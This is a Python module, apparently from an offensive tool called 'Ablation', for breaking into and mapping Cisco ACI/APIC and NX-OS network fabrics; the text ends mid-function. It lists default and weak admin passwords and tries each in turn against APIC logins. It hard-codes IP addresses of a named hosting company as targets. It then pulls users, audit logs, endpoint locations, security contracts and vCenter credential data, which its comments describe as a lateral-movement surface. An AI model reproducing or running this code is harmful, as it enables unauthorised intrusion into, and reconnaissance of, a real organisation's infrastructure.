"""Cisco NX-OS, ACI/APIC, and VXLAN enumeration for Ablation."""

import json
import socket
import subprocess
import re
import urllib.request
import urllib.error
import ssl
import base64
from typing import Optional

# APIC REST API base paths
APIC_API_BASE = "/api"
APIC_LOGIN_PATH = "/api/aaaLogin.json"
APIC_LIST_DOMAINS_PATH = "/api/aaaListDomains.json"   # unauthenticated
APIC_LIST_DOMAIN_PATH = "/api/aaaListDomain.json"
APIC_REFRESH_PATH = "/api/aaaRefresh.json"
APIC_LOGOUT_PATH = "/api/aaaLogout.json"

# MIT class query endpoints — all require auth unless noted
APIC_CLASSES = {
    # Fabric topology
    "fabric_nodes":       "/api/node/class/fabricNode.json",
    "top_system":         "/api/node/class/topSystem.json",
    # Tenant / policy model
    "tenants":            "/api/node/class/fvTenant.json",
    "app_profiles":       "/api/node/class/fvAp.json",
    "epgs":               "/api/node/class/fvAEPg.json",
    "bridge_domains":     "/api/node/class/fvBD.json",
    "vrfs":               "/api/node/class/fvCtx.json",
    "bd_subnets":         "/api/node/class/fvSubnet.json",
    # Contracts (security policy)
    "contracts":          "/api/node/class/vzBrCP.json",      # contract objects
    "contract_subjects":  "/api/node/class/vzSubj.json",       # subjects inside contracts
    "contract_filters":   "/api/node/class/vzFilter.json",     # filter objects
    "filter_entries":     "/api/node/class/vzEntry.json",      # L4 entries (port/proto)
    "contract_prov":      "/api/node/class/fvRsProv.json",     # EPG -> contract provided
    "contract_cons":      "/api/node/class/fvRsCons.json",     # EPG -> contract consumed
    # External connectivity (L3Out)
    "l3out":              "/api/node/class/l3extOut.json",     # L3Out objects
    "l3out_node_prof":    "/api/node/class/l3extLNodeP.json",  # logical node profiles
    "l3out_ext_epg":      "/api/node/class/l3extInstP.json",   # external EPGs / prefixes
    "l3out_subnets":      "/api/node/class/l3extSubnet.json",  # external subnets
    "bgp_peers":          "/api/node/class/bgpPeerP.json",     # BGP peer adjacencies
    # VMM integration (lateral movement surface)
    "vmm_domains":        "/api/node/class/vmmDomP.json",      # VMM domain (vCenter/OpenStack/K8s)
    "vmm_controllers":    "/api/node/class/vmmCtrlrP.json",    # VMM controller (holds vCenter IP)
    "vmm_cred":           "/api/node/class/vmmUsrAccP.json",   # VMM credentials (vCenter username)
    # AAA / user management
    "users":              "/api/node/class/aaaUser.json",
    "aaa_domains":        "/api/node/class/aaaDomain.json",
    "user_roles":         "/api/node/class/aaaRbacRule.json",
    # Audit and logging
    "audit_log":          "/api/node/class/aaaModLR.json",     # configuration change audit log
    "event_log":          "/api/node/class/aaaEpLR.json",      # endpoint event log
    # Endpoint tracking
    "ep_learn":           "/api/node/class/fvCEp.json",        # learned endpoints (MAC/IP/location)
    "ep_to_path":         "/api/node/class/fvRsCEpToPathEp.json",  # endpoint physical location
    # Fabric health / faults
    "fault_summary":      "/api/node/class/faultSummary.json",
    "fault_inst":         "/api/node/class/faultInst.json",
    # Physical domains and VLAN pools
    "physical_domain":    "/api/node/class/physDomP.json",
    "vlan_pools":         "/api/node/class/fvnsVlanInstP.json",
    # VXLAN
    "vxlan_vnids":        "/api/node/class/fvnsVxlanInstP.json",
    "nve_peers":          "/api/node/class/tunnelIf.json",
    # Firmware / version
    "firmware_running":   "/api/node/class/firmwareRunning.json",  # per-node running firmware
    "firmware_repo":      "/api/node/class/firmwareRepoP.json",    # firmware repository images
    # Licensing
    "licenses":           "/api/node/class/licenseEntL.json",
}

# APIC-specific fabric node query with firmware attributes
APIC_FABRICNODE_WITH_FW = (
    "/api/node/class/fabricNode.json"
    "?query-target=self"
    "&rsp-subtree=full"
    "&rsp-subtree-class=firmwareRunning"
)

# Fabric-wide firmware status
APIC_FIRMWARE_STATUS = (
    "/api/node/class/topSystem.json"
    "?query-target=self"
    "&rsp-subtree=full"
    "&rsp-subtree-class=firmwareRunning"
)

# Audit log — last 200 change records
APIC_AUDIT_LOG_PATH = "/api/node/class/aaaModLR.json?order-by=aaaModLR.created|desc&page-size=200"

# L3Out external EPGs with subnets (subtree query)
APIC_L3OUT_FULL = (
    "/api/node/class/l3extOut.json"
    "?query-target=subtree"
    "&target-subtree-class=l3extInstP,l3extSubnet,bgpPeerP,ospfExtP"
)

# EPG-to-EPG contract matrix: provided and consumed together
APIC_CONTRACT_MATRIX_PATH = (
    "/api/node/class/fvAEPg.json"
    "?query-target=subtree"
    "&target-subtree-class=fvRsProv,fvRsCons"
)

# VMM domain full subtree (includes controller IP and credential reference)
APIC_VMM_FULL_PATH = (
    "/api/node/class/vmmDomP.json"
    "?query-target=subtree"
    "&target-subtree-class=vmmCtrlrP,vmmUsrAccP,vmmVSwitchPolicyCont"
)

# Endpoint tracker — all learned endpoints with physical location
APIC_CEP_WITH_PATH = (
    "/api/node/class/fvCEp.json"
    "?query-target=subtree"
    "&target-subtree-class=fvRsCEpToPathEp"
    "&order-by=fvCEp.modTs|desc"
    "&page-size=500"
)

# Cobra SDK download path (self-hosted on APIC — no internet required)
APIC_COBRA_DOWNLOAD = "/cobra/_downloads/"

# NX-OS NETCONF port
NETCONF_PORT = 830

# NX-OS management ports
NXOS_PORTS = {
    22:   "SSH",
    23:   "Telnet (disabled by default)",
    443:  "HTTPS (NXAPI / DCNM)",
    830:  "NETCONF/SSH",
    8080: "NXAPI HTTP",
    8443: "NXAPI HTTPS",
    9443: "DCNM HTTPS",
}

# APIC-specific ports
APIC_PORTS = {
    80:   "APIC HTTP (redirects)",
    443:  "APIC HTTPS REST API",
    7777: "APIC Appliance Director",
}

# NX-OS CLI commands for SSH-based enumeration
NXOS_ENUM_COMMANDS = [
    "show version",
    "show hostname",
    "show license host-id",
    "show license usage",
    "show vdc",
    "show users",
    "show aaa",
    "show tacacs-server",
    "show radius-server",
    "show ip interface brief",
    "show interface mgmt0",
    "show running-config | section aaa",
    "show running-config | section username",
    "show nve peers",
    "show nve vni",
    "show bgp l2vpn evpn summary",
    "show vlan",
    "show cdp neighbors",
    "show lldp neighbors",
    "show environment",
    "show inventory",
]

# Default credentials for NX-OS — no hardcoded default password;
# admin password is set at first boot. These are common weak passwords.
NXOS_DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "Admin1234!"),
    ("admin", "cisco"),
    ("admin", "cisco123"),
    ("admin", "Cisco123!"),
    ("admin", "password"),
    ("admin", ""),
    ("cisco", "cisco"),
]

# APIC-specific default credentials.
# ins3965! — Cisco factory default set during APIC first-boot wizard
#             before the operator completes setup (CIMC/iDRAC stage).
# C1sco12345 — common Cisco TAC / lab default; appears in CVE PoCs
#              and older APIC installation guides.
# cisco123   — used in Cisco official training materials (Zero to Hero,
#              CCNP ACI) as the canonical demo password.
# admin/password — CIMC (Cisco IMC) default before setup wizard completion.
APIC_DEFAULT_CREDS = [
    ("admin", "ins3965!"),
    ("admin", "C1sco12345"),
    ("admin", "cisco123"),
    ("admin", "cisco"),
    ("admin", "Admin1234!"),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", ""),
]

# MacStadium-specific APIC/NX-OS targets inferred from network recon
MACSTADIUM_CISCO_TARGETS = [
    {"ip": "207.254.14.1",  "role": "nxos-switch",      "site": "atl"},  # confirmed OU=dcnxos nginx/1.7.10
    {"ip": "207.254.14.2",  "role": "apic-candidate",  "site": "atl"},
    {"ip": "207.254.14.3",  "role": "apic-candidate",  "site": "atl"},
    {"ip": "207.254.14.4",  "role": "apic-candidate",  "site": "atl"},
    {"ip": "207.254.14.10", "role": "nxos-leaf",        "site": "atl"},
    {"ip": "207.254.14.11", "role": "nxos-leaf",        "site": "atl"},
    {"ip": "207.254.14.20", "role": "nxos-spine",       "site": "atl"},
    {"ip": "207.254.14.21", "role": "nxos-spine",       "site": "atl"},
]

# SSL context that skips cert validation
_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE


def classify_by_cert_ou(host: str, port: int = 443, timeout: float = 5.0) -> dict:
    """
    Discriminate NX-OS switch vs APIC controller by TLS cert OU field.
    Both expose /api/aaaLogin.json (APIC-Cookie framework) — the cert is the
    only reliable discriminator without attempting auth.

    OU=dcnxos  → NX-OS switch  (NX-API at /api/aaaLogin.json)
    OU=dcapic  → APIC controller (APIC REST at /api/aaaLogin.json)

    # MacStadium: 207.254.14.1 confirmed OU=dcnxos (NX-OS 9.x)
    """
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    result = {
        'host':        host,
        'port':        port,
        'ou':          'unknown',
        'cn':          '',
        'org':         '',
        'device_type': 'UNKNOWN',
        'raw_cert':    {},
        'error':       None,
    }
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert(binary_form=False)
                result['raw_cert'] = cert
                subject = {k: v for tup in cert.get('subject', []) for k, v in tup}
                ou = subject.get('organizationalUnitName', '').lower()
                result['ou']  = ou or 'unknown'
                result['cn']  = subject.get('commonName', '')
                result['org'] = subject.get('organizationName', '')
                if ou == 'dcnxos':
                    result['device_type'] = 'NXOS_SWITCH'
                elif ou == 'dcapic':
                    result['device_type'] = 'APIC_CONTROLLER'
                else:
                    result['device_type'] = 'UNKNOWN'
    except Exception as e:
        result['error'] = str(e)
    return result


def _apic_get(apic_host: str, path: str, token: Optional[str] = None,
              timeout: int = 8) -> Optional[dict]:
    url = f"https://{apic_host}{path}"
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Cookie"] = f"APIC-cookie={token}"
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, context=_SSL_CTX, timeout=timeout) as r:
            return json.loads(r.read().decode())
    except Exception:
        return None


def _apic_post(apic_host: str, path: str, body: dict,
               token: Optional[str] = None, timeout: int = 8) -> Optional[dict]:
    url = f"https://{apic_host}{path}"
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Cookie"] = f"APIC-cookie={token}"
    data = json.dumps(body).encode()
    try:
        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        with urllib.request.urlopen(req, context=_SSL_CTX, timeout=timeout) as r:
            return json.loads(r.read().decode())
    except Exception:
        return None


def probe_apic_unauthenticated(apic_host: str) -> dict:
    """Probe APIC for unauthenticated surface (aaaListDomains)."""
    result = {
        "host": apic_host,
        "reachable": False,
        "aaa_domains": [],
        "raw_domains_response": None,
    }

    # TCP probe first
    try:
        sock = socket.create_connection((apic_host, 443), timeout=5)
        sock.close()
        result["reachable"] = True
    except Exception:
        return result

    # Unauthenticated: list AAA domains
    resp = _apic_get(apic_host, APIC_LIST_DOMAINS_PATH)
    if resp:
        result["raw_domains_response"] = resp
        try:
            imdata = resp.get("imdata", [])
            for item in imdata:
                for cls, attrs in item.items():
                    domain_name = attrs.get("attributes", {}).get("name", "")
                    if domain_name:
                        result["aaa_domains"].append(domain_name)
        except Exception:
            pass

    return result


def apic_login(apic_host: str, username: str, password: str) -> Optional[str]:
    """Login to APIC and return auth token, or None."""
    body = {"aaaUser": {"attributes": {"name": username, "pwd": password}}}
    resp = _apic_post(apic_host, APIC_LOGIN_PATH, body)
    if not resp:
        return None
    try:
        token = resp["imdata"][0]["aaaLogin"]["attributes"]["token"]
        return token
    except (KeyError, IndexError):
        return None


def apic_brute_creds(apic_host: str) -> dict:
    """Try common NX-OS/APIC credential pairs against APIC login.

    Tries APIC_DEFAULT_CREDS first (APIC-specific), then NXOS_DEFAULT_CREDS.
    APIC factory default is admin/ins3965! before setup wizard completes.
    """
    result = {"success": False, "username": None, "password": None, "token": None}
    for user, pwd in (APIC_DEFAULT_CREDS + NXOS_DEFAULT_CREDS):
        token = apic_login(apic_host, user, pwd)
        if token:
            result["success"] = True
            result["username"] = user
            result["password"] = pwd
            result["token"] = token
            break
    return result


def apic_enumerate(apic_host: str, token: str) -> dict:
    """Full APIC MIT enumeration with valid auth token.

    Queries all MIT classes in APIC_CLASSES, then runs targeted subtree
    queries for contract matrix, L3Out networks, VMM domains, audit log,
    firmware state, and endpoint tracker.
    """
    findings = {
        "host": apic_host,
        "token": token[:24] + "...",
        "classes": {},
        "summary": {},
    }

    for key, path in APIC_CLASSES.items():
        resp = _apic_get(apic_host, path, token=token)
        if resp and "imdata" in resp:
            items = resp["imdata"]
            findings["classes"][key] = items
            findings["summary"][key] = len(items)
        else:
            findings["classes"][key] = []
            findings["summary"][key] = 0

    # Extract VTEPs from fabric nodes with firmware
    vteps = []
    for node in findings["classes"].get("fabric_nodes", []):
        attrs = list(node.values())[0].get("attributes", {})
        address = attrs.get("address", "")
        role = attrs.get("role", "")
        dn = attrs.get("dn", "")
        if address:
            vteps.append({"address": address, "role": role, "dn": dn})
    findings["vteps"] = vteps

    # Firmware version per node (separate query with subtree)
    findings["firmware"] = apic_get_firmware_versions(apic_host, token)

    # Extract tenant names
    tenants = []
    for t in findings["classes"].get("tenants", []):
        attrs = list(t.values())[0].get("attributes", {})
        tenants.append(attrs.get("name", ""))
    findings["tenant_names"] = [t for t in tenants if t]

    # Extract usernames with roles and login timestamps
    users = []
    for u in findings["classes"].get("users", []):
        attrs = list(u.values())[0].get("attributes", {})
        users.append({
            "name": attrs.get("name", ""),
            "domain": attrs.get("domain", ""),
            "role": attrs.get("roledn", ""),
            "last_login": attrs.get("lastLoginTime", ""),
            "phone": attrs.get("phone", ""),
            "email": attrs.get("email", ""),
        })
    findings["users"] = users

    # EPG-to-EPG contract matrix
    findings["contract_matrix"] = apic_get_contract_matrix(apic_host, token)

    # L3Out external network enumeration
    findings["l3out_networks"] = apic_get_l3out_networks(apic_host, token)

    # VMM domain enumeration (lateral movement: vCenter/OpenStack/K8s creds)
    findings["vmm_domains"] = apic_get_vmm_domains(apic_host, token)

    # Audit log (last 200 changes — admin activity, cred resets, topology mods)
    findings["audit_log"] = apic_get_audit_log(apic_host, token)

    # Endpoint tracker (learned MAC/IP with physical location)
    findings["endpoints"] = apic_get_endpoints(apic_host, token)

    # SSH authorized_keys check (APIC runs CentOS; admin has shell access)
    findings["ssh_keys"] = apic_check_ssh_keys(apic_host, token)

    # Fabric nodes with firmware versions (enhanced — role/serial/model per node)
    findings["fabric_nodes_enriched"] = apic_get_fabric_nodes(apic_host, token)

    # VMM providers (vCenter/OpenStack/K8s integration with controller IPs)
    findings["vmm_providers"] = apic_get_vmm_providers(apic_host, token)

    # Service graph device clusters (L4-L7 appliances)
    findings["service_graphs"] = apic_get_service_graphs(apic_host, token)

    # Tenants with health scores
    findings["tenants_enriched"] = apic_get_tenants(apic_host, token)

    # Contracts with L4 filter entries (flag any-any permit)
    findings["contracts_enriched"] = apic_get_contracts(apic_host, token)
    findings["permit_all_contracts"] = [
        c for c in findings["contracts_enriched"] if c.get("permit_all")
    ]

    # X.509 cert auth capability probe
    findings["cert_auth"] = apic_cert_auth(apic_host, "admin", "")

    # Out-of-band management IP assignments per node
    findings["oob_mgmt"] = apic_get_out_of_band_mgmt(apic_host, token)

    # Config export check (list existing policies; trigger only if none exist)
    findings["config_export"] = apic_export_config(apic_host, token)

    return findings


def apic_get_firmware_versions(apic_host: str, token: str) -> list:
    """Query per-node running firmware version via fabricNode + firmwareRunning subtree.

    fabricNode.json attributes include: address, role, id, dn, model, serial.
    firmwareRunning (child) adds: version, ts (timestamp).
    Also queries topSystem for APIC controller nodes (role=controller).
    """
    results = []

    # Path: fabricNode with firmware child objects
    path = (
        "/api/node/class/fabricNode.json"
        "?rsp-subtree=full"
        "&rsp-subtree-class=firmwareRunning"
    )
    resp = _apic_get(apic_host, path, token=token)
    if resp and "imdata" in resp:
        for item in resp["imdata"]:
            attrs = list(item.values())[0].get("attributes", {})
            children = list(item.values())[0].get("children", [])
            fw_ver = ""
            fw_ts = ""
            for child in children:
                if "firmwareRunning" in child:
                    fw_attrs = child["firmwareRunning"].get("attributes", {})
                    fw_ver = fw_attrs.get("version", "")
                    fw_ts = fw_attrs.get("ts", "")
            results.append({
                "dn": attrs.get("dn", ""),
                "address": attrs.get("address", ""),
                "role": attrs.get("role", ""),
                "model": attrs.get("model", ""),
                "serial": attrs.get("serial", ""),
                "fw_version": fw_ver,
                "fw_ts": fw_ts,
            })

    return results


def apic_get_contract_matrix(apic_host: str, token: str) -> dict:
    """Extract EPG-to-EPG contract matrix.

    Maps each EPG DN -> list of provided contracts and consumed contracts.
    Contract name resolves to vzBrCP which contains vzSubj -> vzFilter -> vzEntry
    (port/protocol L4 entries). This gives the full security policy topology:
    who can talk to whom and on which ports.

    Matrix format: {epg_dn: {provided: [...], consumed: [...]}}
    """
    matrix: dict = {}

    # Provided contracts per EPG
    resp = _apic_get(apic_host, "/api/node/class/fvRsProv.json", token=token)
    if resp and "imdata" in resp:
        for item in resp["imdata"]:
            attrs = item.get("fvRsProv", {}).get("attributes", {})
            epg_dn = attrs.get("dn", "").rsplit("/rsprov-", 1)[0]
            contract = attrs.get("tnVzBrCPName", "") or attrs.get("tDn", "")
            state = attrs.get("state", "")
            if epg_dn:
                matrix.setdefault(epg_dn, {"provided": [], "consumed": []})
                matrix[epg_dn]["provided"].append({"contract": contract, "state": state})

    # Consumed contracts per EPG
    resp = _apic_get(apic_host, "/api/node/class/fvRsCons.json", token=token)
    if resp and "imdata" in resp:
        for item in resp["imdata"]:
            attrs = item.get("fvRsCons", {}).get("attributes", {})
            epg_dn = attrs.get("dn", "").rsplit("/rscons-", 1)[0]
            contract = attrs.get("tnVzBrCPName", "") or attrs.get("tDn", "")
            state = attrs.get("state", "")
            if epg_dn:
                matrix.setdefault(epg_dn, {"provided": [], "consumed": []})
                matrix[epg_dn]["consumed"].append({"contract": contract, "state": state})

    # Pull contract filter entries (L4 port/proto rules) for context
    filter_entries: dict = {}
    resp = _apic_get(apic_host, "/api/node/class/vzEntry.json", token=token)
    if resp and "imdata" in resp:
        for item in resp["imdata"]:
            attrs = item.get("vzEntry", {}).get("attributes", {})
            filter_dn = attrs.get("dn", "").rsplit("/e-", 1)[0]
            filter_entries.setdefault(filter_dn, [])
            filter_entries[filter_dn].append({
                "name": attrs.get("name", ""),
                "ethertype": attrs.get("etherT", ""),
                "proto": attrs.get("prot", ""),
                "dst_from": attrs.get("dFromPort", ""),
                "dst_to": attrs.get("dToPort", ""),
            })

    return {"epg_contract_matrix": matrix, "filter_entries": filter_entries}


def apic_get_l3out_networks(apic_host: str, token: str) -> list:
    """Enumerate L3Out external network configurations.

    L3Out (l3extOut) is the ACI construct connecting the fabric to external
    routed networks. Each L3Out contains:
      - l3extLNodeP: logical node profiles (which leaf nodes participate)
      - l3extInstP: external EPG — defines which external prefixes are allowed
      - l3extSubnet: specific IP prefixes with scope (external/shared/export)
      - bgpPeerP: BGP peer adjacencies (reveals upstream routers)

    This is a high-value target: L3Out misconfigs leak internal prefixes
    externally and external prefixes into wrong VRFs.
    """
    results = []

    path = (
        "/api/node/class/l3extOut.json"
        "?query-target=subtree"
        "&target-subtree-class=l3extInstP,l3extSubnet,l3extLNodeP,bgpPeerP,ospfExtP"
    )
    resp = _apic_get(apic_host, path, token=token)
    if not resp or "imdata" not in resp:
        # Fallback: flat queries for each class
        l3outs_raw = _apic_get(apic_host, "/api/node/class/l3extOut.json", token=token)
        ext_epg_raw = _apic_get(apic_host, "/api/node/class/l3extInstP.json", token=token)
        subnet_raw = _apic_get(apic_host, "/api/node/class/l3extSubnet.json", token=token)
        bgp_raw = _apic_get(apic_host, "/api/node/class/bgpPeerP.json", token=token)

        l3outs_by_dn: dict = {}
        if l3outs_raw and "imdata" in l3outs_raw:
            for item in l3outs_raw["imdata"]:
                attrs = item.get("l3extOut", {}).get("attributes", {})
                dn = attrs.get("dn", "")
                l3outs_by_dn[dn] = {
                    "dn": dn,
                    "name": attrs.get("name", ""),
                    "tenant": dn.split("/")[1].replace("tn-", "") if "/tn-" in dn else "",
                    "vrf": attrs.get("tnFvCtxName", ""),
                    "enforce_rtctrl": attrs.get("enforceRtctrl", ""),
                    "ext_epgs": [],
                    "subnets": [],
                    "bgp_peers": [],
                }
        if ext_epg_raw and "imdata" in ext_epg_raw:
            for item in ext_epg_raw["imdata"]:
                attrs = item.get("l3extInstP", {}).get("attributes", {})
                dn = attrs.get("dn", "")
                # parent L3Out DN: strip /instP-<name>
                parent = "/".join(dn.split("/")[:-1])
                if parent in l3outs_by_dn:
                    l3outs_by_dn[parent]["ext_epgs"].append({
                        "name": attrs.get("name", ""),
                        "dn": dn,
                    })
        if subnet_raw and "imdata" in subnet_raw:
            for item in subnet_raw["imdata"]:
                attrs = item.get("l3extSubnet", {}).get("attributes", {})
                dn = attrs.get("dn", "")
                # grandparent is instP; great-grandparent is l3extOut
                parts = dn.split("/")
                l3out_dn = "/".join(parts[:3])  # uni/tn-X/out-Y
                if l3out_dn in l3outs_by_dn:
                    l3outs_by_dn[l3out_dn]["subnets"].append({
                        "ip": attrs.get("ip", ""),
                        "scope": attrs.get("scope", ""),  # external/shared/export-rtctrl
                        "aggregate": attrs.get("aggregate", ""),
                    })
        if bgp_raw and "imdata" in bgp_raw:
            for item in bgp_raw["imdata"]:
                attrs = item.get("bgpPeerP", {}).get("attributes", {})
                dn = attrs.get("dn", "")
                parts = dn.split("/")
                l3out_dn = "/".join(parts[:3])
                if l3out_dn in l3outs_by_dn:
                    l3outs_by_dn[l3out_dn]["bgp_peers"].append({
                        "addr": attrs.get("addr", ""),
                        "remote_asn": attrs.get("peerT", "") or attrs.get("ctrl", ""),
                    })
        results = list(l3outs_by_dn.values())
        return results

    # Parse subtree response
    current: dict = {}
    for item in resp["imdata"]:
        cls_name = list(item.keys())[0]
        attrs = item[cls_name].get("attributes", {})
        dn = attrs.get("dn", "")
        if cls_name == "l3extOut":
            current_dn = dn
            current[current_dn] = {
                "dn": dn,
                "name": attrs.get("name", ""),
                "tenant": dn.split("/")[1].replace("tn-", "") if "tn-" in dn else "",
                "vrf": attrs.get("tnFvCtxName", ""),
                "ext_epgs": [],
                "subnets": [],
                "bgp_peers": [],
            }
        elif cls_name == "l3extInstP":
            l3out_dn = "/".join(dn.split("/")[:3])
            if l3out_dn in current:
                current[l3out_dn]["ext_epgs"].append({
                    "name": attrs.get("name", ""), "dn": dn})
        elif cls_name == "l3extSubnet":
            l3out_dn = "/".join(dn.split("/")[:3])
            if l3out_dn in current:
                current[l3out_dn]["subnets"].append({
                    "ip": attrs.get("ip", ""),
                    "scope": attrs.get("scope", ""),
                    "aggregate": attrs.get("aggregate", ""),
                })
        elif cls_name == "bgpPeerP":
            l3out_dn = "/".join(dn.split("/")[:3])
            if l3out_dn in current:
                current[l3out_dn]["bgp_peers"].append({
                    "addr": attrs.get("addr", ""),
                })

    return list(current.values())


def apic_get_vmm_domains(apic_host: str, token: str) -> list:
    """Enumerate VMM domains — lateral movement surface.

    VMM integration connects APIC to hypervisor management planes:
      - VMware vCenter (vmmCtrlrP.hostOrIp = vCenter IP/hostname,
        vmmUsrAccP.name = vCenter username stored in APIC)
      - Microsoft SCVMM
      - OpenStack Neutron
      - Kubernetes (via ACI CNI acc-provision)

    Exposures:
      1. vCenter IP and username disclosed in vmmCtrlrP/vmmUsrAccP objects.
      2. APIC stores vCenter credentials — extracting them enables direct
         vCenter API access (lateral movement from network admin to VM admin).
      3. K8s integration creates a dedicated ACI CNI user with leaf-scope
         admin; compromising APIC grants that user's token.
      4. Port groups managed by APIC in vCenter are named after ACI EPGs —
         direct mapping of the security segmentation model.
    """
    results = []

    path = (
        "/api/node/class/vmmDomP.json"
        "?query-target=subtree"
        "&target-subtree-class=vmmCtrlrP,vmmUsrAccP"
    )
    resp = _apic_get(apic_host, path, token=token)
    if not resp or "imdata" not in resp:
        # Fallback: flat class queries
        dom_resp = _apic_get(apic_host, "/api/node/class/vmmDomP.json", token=token)
        ctrl_resp = _apic_get(apic_host, "/api/node/class/vmmCtrlrP.json", token=token)
        acc_resp = _apic_get(apic_host, "/api/node/class/vmmUsrAccP.json", token=token)

        domains: dict = {}
        if dom_resp and "imdata" in dom_resp:
            for item in dom_resp["imdata"]:
                attrs = item.get("vmmDomP", {}).get("attributes", {})
                dn = attrs.get("dn", "")
                domains[dn] = {
                    "name": attrs.get("name", ""),
                    "dn": dn,
                    "provider": attrs.get("type", "VMware"),
                    "controllers": [],
                    "credentials": [],
                }
        if ctrl_resp and "imdata" in ctrl_resp:
            for item in ctrl_resp["imdata"]:
                attrs = item.get("vmmCtrlrP", {}).get("attributes", {})
                dn = attrs.get("dn", "")
                parent_dn = "/".join(dn.split("/")[:-1])
                if parent_dn in domains:
                    domains[parent_dn]["controllers"].append({
                        "name": attrs.get("name", ""),
                        "host_or_ip": attrs.get("hostOrIp", ""),
                        "datacenter": attrs.get("rootContName", ""),
                        "mode": attrs.get("mode", ""),
                        "dvs_version": attrs.get("dvsVersion", ""),
                        "scope": attrs.get("scope", ""),
                        "stats_mode": attrs.get("statsMode", ""),
                    })
        if acc_resp and "imdata" in acc_resp:
            for item in acc_resp["imdata"]:
                attrs = item.get("vmmUsrAccP", {}).get("attributes", {})
                dn = attrs.get("dn", "")
                parent_dn = "/".join(dn.split("/")[:-1])
                if parent_dn in domains:
                    domains[parent_dn]["credentials"].append({
                        "name": attrs.get("name", ""),
                        "usr": attrs.get("usr", ""),
                        # password attribute exists but is masked in API output
                        "pwd_set": bool(attrs.get("pwd", "")),
                    })
        results = list(domains.values())
        return results

    # Parse subtree response
    domains: dict = {}
    for item in resp["imdata"]:
        cls_name = list(item.keys())[0]
        attrs = item[cls_name].get("attributes", {})
        dn = attrs.get("dn", "")
        if cls_name == "vmmDomP":
            domains[dn] = {
                "name": attrs.get("name", ""),
                "dn": dn,
                "provider": attrs.get("type", "VMware"),
                "controllers": [],
                "credentials": [],
            }
        elif cls_name == "vmmCtrlrP":
            parent_dn = "/".join(dn.split("/")[:-1])
            if parent_dn in domains:
                domains[parent_dn]["controllers"].append({
                    "name": attrs.get("name", ""),
                    "host_or_ip": attrs.get("hostOrIp", ""),
                    "datacenter": attrs.get("rootContName", ""),
                    "mode": attrs.get("mode", ""),
                    "dvs_version": attrs.get("dvsVersion", ""),
                })
        elif cls_name == "vmmUsrAccP":
            parent_dn = "/".join(dn.split("/")[:-1])
            if parent_dn in domains:
                domains[parent_dn]["credentials"].append({
                    "name": attrs.get("name", ""),
                    "usr": attrs.get("usr", ""),
                    "pwd_set": bool(attrs.get("pwd", "")),
                })

    return list(domains.values())


def apic_get_audit_log(apic_host: str, token: str,
                       page_size: int = 200) -> list:
    """Extract APIC configuration change audit log (aaaModLR).

    Each aaaModLR record captures: who changed what, when, from which IP,
    and what the previous vs new value was. High-value for:
      - Identifying admin accounts and their source IPs
      - Detecting recent credential changes (pwd field changes)
      - Reconstructing topology changes before/after an incident
      - Finding automation accounts by pattern (frequent API-sourced changes)
    """
    path = (
        f"/api/node/class/aaaModLR.json"
        f"?order-by=aaaModLR.created|desc"
        f"&page-size={page_size}"
    )
    resp = _apic_get(apic_host, path, token=token)
    if not resp or "imdata" not in resp:
        return []

    records = []
    for item in resp["imdata"]:
        attrs = item.get("aaaModLR", {}).get("attributes", {})
        records.append({
            "dn": attrs.get("dn", ""),
            "user": attrs.get("user", ""),
            "action": attrs.get("action", ""),         # created/modified/deleted
            "affected_dn": attrs.get("affected", ""),  # which object was changed
            "descr": attrs.get("descr", ""),
            "change_set": attrs.get("changeSet", ""),  # old -> new attribute values
            "client_ip": attrs.get("clientRemoteAddr", "") or attrs.get("sessionId", ""),
            "created": attrs.get("created", ""),
            "id": attrs.get("id", ""),
        })
    return records


def apic_get_endpoints(apic_host: str, token: str,
                       page_size: int = 500) -> list:
    """Query learned endpoint table (fvCEp) — MAC/IP/location/EPG.

    fvCEp is populated by the COOP (Council of Oracle Protocols) database
    on spine nodes. Each entry reveals:
      - MAC address of the endpoint
      - IP address (if known)
      - Which EPG the endpoint belongs to (via dn hierarchy)
      - Physical location: pod/node/port (via fvRsCEpToPathEp child)
      - Encapsulation VLAN ID

    Lateral movement use: enumerate all VMs/containers by IP + EPG membership
    to map the full workload topology without touching the compute layer.
    """
    path = (
        f"/api/node/class/fvCEp.json"
        f"?order-by=fvCEp.modTs|desc"
        f"&page-size={page_size}"
        f"&rsp-subtree=full"
        f"&rsp-subtree-class=fvRsCEpToPathEp,fvIp"
    )
    resp = _apic_get(apic_host, path, token=token)
    if not resp or "imdata" not in resp:
        return []

    endpoints = []
    for item in resp["imdata"]:
        attrs = item.get("fvCEp", {}).get("attributes", {})
        children = item.get("fvCEp", {}).get("children", [])
        dn = attrs.get("dn", "")

        # Extract EPG from DN: uni/tn-X/ap-Y/epg-Z/cep-MAC
        epg_dn = "/".join(dn.split("/")[:4]) if dn.count("/") >= 4 else ""

        paths = []
        extra_ips = []
        for child in children:
            if "fvRsCEpToPathEp" in child:
                path_attrs = child["fvRsCEpToPathEp"].get("attributes", {})
                paths.append(path_attrs.get("tDn", ""))
            elif "fvIp" in child:
                ip_attrs = child["fvIp"].get("attributes", {})
                extra_ips.append(ip_attrs.get("addr", ""))

        endpoints.append({
            "mac": attrs.get("mac", ""),
            "ip": attrs.get("ip", ""),
            "extra_ips": extra_ips,
            "epg_dn": epg_dn,
            "encap": attrs.get("encap", ""),
            "lcC": attrs.get("lcC", ""),          # learn context (learned/static/vmm)
            "physical_paths": paths,
            "mod_ts": attrs.get("modTs", ""),
        })
    return endpoints


def apic_check_ssh_keys(apic_host: str, token: str) -> dict:
    """Check for SSH authorized_keys on the APIC Linux OS layer.

    APIC runs on CentOS; the admin user has a bash shell accessible via
    SSH on port 22. Authorized keys are stored at /home/admin/.ssh/authorized_keys.
    The REST API does not expose filesystem contents directly, but the
    aaaUserCert class stores X.509 certificates uploaded for signature-based
    auth — extracting these reveals which external systems have cert-based
    REST API access (no password required per call).

    SSH key presence is checked via: /api/node/class/aaaUserCert.json
    """
    result = {
        "x509_certs": [],
